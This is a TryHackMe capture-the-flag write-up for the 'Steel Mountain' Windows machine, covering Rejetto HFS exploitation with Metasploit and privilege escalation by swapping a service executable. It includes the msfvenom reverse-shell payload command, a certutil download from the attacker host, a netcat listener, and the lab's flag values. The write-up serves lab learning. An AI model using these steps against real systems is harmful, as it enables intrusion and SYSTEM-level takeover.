# THM: Mr. Robot 2 CTF: Steel Mountain

## Challenge Details

- **Platform:** [[TryHackMe]]
- **Challenge Type:** [[Windows Exploitation]], [[Web Exploitation]], [[Privilege Escalation]], [[Service Exploitation]]
- **Difficulty:** Medium
- **Target IP/URL:** `10.10.26.111`
- **Status:** #solved
- **Date Solved:** [[2025-05-14]]

## 🎯 Objective

The "Steel Mountain" CTF aimed to gain initial access to a Windows machine by exploiting a vulnerable web server and then escalate privileges to `NT AUTHORITY\SYSTEM` to retrieve the hidden flags.

## 🛠️ Tools Used

- [[Nmap]]
- [[Metasploit]] (`msfconsole`, `msfvenom`)
- [[Netcat]] (`nc`)
- `rlwrap`
- `certutil`
- [[Python3]]
- [[Python2]] (for exploit server)
- `PowerUp.ps1`
- `winPEASx64.exe`

---

## 🔍 Reconnaissance

The initial phase involved a comprehensive network scan to identify active services and potential entry points on the target Windows machine.

### Nmap Scan

An `nmap` scan was performed to enumerate open ports and identify running services, including their versions and common script results.

Bash

```
nmap -sV -sC -Pn 10.10.26.111
```

The scan revealed several open ports, providing a clear picture of the target's network footprint:

- **80/tcp:** HTTP (Microsoft IIS httpd 8.5)
- **135/tcp:** msrpc
- **139/tcp:** netbios-ssn
- **445/tcp:** microsoft-ds (SMB)
- **3389/tcp:** ms-wbt-server (RDP)
- **5985/tcp:** HTTP (Microsoft HTTPAPI httpd 2.0: likely WinRM)
- **8080/tcp:** HTTP (HttpFileServer httpd 2.3: a critical finding)
- **Various RPC ports (49152+):** Dynamic RPC ports

## 🌐 Initial Web Exploration

The `nmap` scan highlighted multiple web services. Our investigation began with the primary HTTP port (80) and then shifted to the less common port (8080).

### Question 1: Who is the employee of the month?

Navigating to `http://10.10.26.111` displayed a webpage featuring an "Employee of the Month" photograph. Downloading and examining the image revealed the name: **Bill Harper**.

### Question 2: Scan the machine with nmap. What is the other port running a web server on?

As clearly identified in the `nmap` output, another web server was running on port **8080**.

### Question 3: Take a look at the other web server. What file server is running?

Browse to `http://10.10.26.111:8080` presented the interface for **Rejetto HTTP File Server (HFS) 2.3**. This was corroborated by the `http-server-header` information from the `nmap` scan.

### Question 4: What is the CVE number to exploit this file server?

A quick search for "Rejetto HTTP File Server exploit" on resources like Exploit Database (exploit-db.com) quickly identified the relevant vulnerability and its identifier: **CVE-2014-6287**. This confirmed a known exploit path for the Rejetto HFS version.

---

## 💥 Initial Shell via Metasploit

With a clear vulnerability identified (Rejetto HFS 2.3, CVE-2014-6287), Metasploit was used to gain an initial shell on the target machine.

### Exploiting Rejetto HFS with Metasploit

The following steps were performed within `msfconsole`:

Bash

```
msfconsole
search 2014-6287
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOST 10.10.26.111
set RPORT 8080
set LHOST [Your Attacking Machine IP]
exploit
```

The exploit successfully delivered a Meterpreter shell, which was then transitioned to a standard command shell for better interaction.

```
meterpreter > shell
```

### User Identification and Flag Discovery

Once in the shell, the current user was identified:

Bash

```
whoami
```

**Result:** `steelmountain\bill`

Navigating to Bill's desktop revealed the `user.txt` file containing the first flag.

Bash

```
cd c:\users\bill\desktop
dir
```

## 🔑 User Flag

The `user.txt` file contained the following flag:

```
b04763b6fcf51fcd7c13abc7db4fd365
```

---

## 📈 Privilege Escalation via Service Exploitation

With a user-level shell, the next objective was to escalate privileges to `NT AUTHORITY\SYSTEM`. Common Windows privilege escalation techniques often involve identifying misconfigured services.

### Enumerating Vulnerable Services with PowerUp.ps1

The `PowerUp.ps1` script, part of the PowerSploit framework, is designed to identify common Windows privilege escalation vectors. It was uploaded to the target machine using Meterpreter's `upload` command.

PowerShell

```
upload PowerUp.ps1 c:\\users\\bill\\desktop\\PowerUp.ps1
load powershell            # Load the PowerShell extension in Meterpreter
powershell_shell           # Drop into a PowerShell prompt
. .\PowerUp.ps1            # Dot-source the script to load its functions
Invoke-AllChecks           # Run all checks for privilege escalation
```

The `Invoke-AllChecks` output highlighted a potentially vulnerable service: `AdvancedSystemCareService9`. Crucially, its `CanRestart` property was `True`, indicating that we could stop and restart this service. This is a strong indicator of a service misconfiguration where we could replace the service's executable with our own malicious payload.

### Crafting a Malicious Service Executable

A reverse shell executable was generated using `msfvenom`, specifically tailored as a Windows service executable.

Bash

```
msfvenom -p windows/shell_reverse_tcp LHOST=[Your Attacking Machine IP] LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

### Hosting and Transferring the Payload

A simple HTTP server was started on the Kali machine to host the `Advanced.exe` file, making it accessible for download by the target.

Bash

```
python -m http.server 80
```

On the target machine, the `Advanced.exe` payload was downloaded to the service's installation directory using `certutil`, a built-in Windows utility capable of downloading files.

PowerShell

```
cd "C:\Program Files (x86)\IObit"
certutil -urlcache -f http://[Your Attacking Machine IP]:80/Advanced.exe Advanced.exe
```

### Replacing the Service Executable and Gaining Root

After downloading the payload, the PowerShell shell was exited (`Ctrl+C`), returning to the Meterpreter standard shell. A `netcat` listener was set up on the Kali machine to catch the incoming root shell.

**On Kali (Netcat Listener):**

Bash

```
rlwrap nc -nvlp 4443
```

**On Target Machine (Standard Shell):**

The vulnerable service was stopped, its original executable was replaced with our `Advanced.exe` payload, and then the service was restarted.

Bash

```
sc stop AdvancedSystemCareService9
copy Advanced.exe "Advanced SystemCare"
sc start AdvancedSystemCareService9
```

Restarting the service triggered the execution of our malicious `Advanced.exe`, which connected back to our `netcat` listener, providing a shell as `NT AUTHORITY\SYSTEM`.

**Netcat Listener Output (Root Shell):**

```
listening on [any] 4443 ...
connect to [10.10.26.111] from [10.10.26.111] 49158
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

With `NT AUTHORITY\SYSTEM` privileges, the final flag was located in the Administrator's desktop directory.

Bash

```
C:\Windows\system32>cd C:\Users\Administrator\Desktop
C:\Users\system32>dir
# ... (listing of files)
C:\Users\Administrator\Desktop>type root.txt
```

---

## 🏆 Root Flag

The `root.txt` file contained the final flag:

```
9af5f314f57607c00fd09803a587db80
```

---

## 📝 Alternate Method: winPEAS (Partial)

As an alternative approach, `winPEASx64.exe` was downloaded and executed on the target machine.

PowerShell

```
winPEASx64.exe
```

`winPEAS` is another excellent tool for automated privilege escalation enumeration on Windows. Its output confirmed similar misconfigurations or special privileges on objects, including indications of the same DLL hijack potential identified by `PowerUp.ps1`. This confirmed the validity of the chosen escalation path.

---

## 📚 Lessons Learned

- **Windows Enumeration:** Windows CTFs require a different enumeration mindset compared to Linux. Understanding services, their configurations, and permissions is crucial.
- **Web Server Vulnerabilities:** Always investigate all web servers identified during `nmap` scans, as less common ports often host vulnerable applications.
- **Service Exploitation:** Misconfigured Windows services (especially those with `CanRestart` or weak permissions on their executables) are prime targets for privilege escalation.
- **Payload Delivery:** `certutil` is a valuable built-in Windows utility for downloading arbitrary files, making it effective for payload transfer.
- **Automated PE Tools:** Tools like `PowerUp.ps1` and `winPEAS` significantly streamline the privilege escalation process by automatically identifying common weaknesses.
- **Metasploit Proficiency:** Metasploit remains a powerful and versatile framework for exploiting known vulnerabilities and generating payloads.

## ✨ Additional Notes

"Steel Mountain" provided an excellent hands-on experience in typical Windows exploitation methodologies, from web server compromise to service-based privilege escalation. It reinforced the importance of systematic reconnaissance and leveraging automated tools for efficient vulnerability identification.

---

[[CTF Writeups]] [[TryHackMe]] [[Windows Exploitation]] [[Privilege Escalation]]
